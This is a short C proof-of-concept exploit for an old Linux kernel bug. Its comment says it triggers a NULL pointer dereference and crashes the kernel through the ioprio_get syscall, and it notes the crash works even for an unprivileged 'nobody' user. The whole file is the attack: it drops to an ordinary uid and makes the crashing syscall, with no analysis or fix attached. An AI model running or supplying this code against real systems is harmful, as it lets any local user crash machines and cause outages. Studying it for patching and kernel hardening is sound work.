/* crashes linux2.* with a NULL pointer issue
 * BUG: unable to handle kernel NULL pointer dereference at 00000000000000e8
 * Works when getpgrp() == 0.
 */

#include <unistd.h>
#include <sys/syscall.h>

int main(int argc, char **argv)
{
    setuid(1000); /* even works as nobody! */
    syscall(SYS_ioprio_get, 2, 0);
    return 0;
}
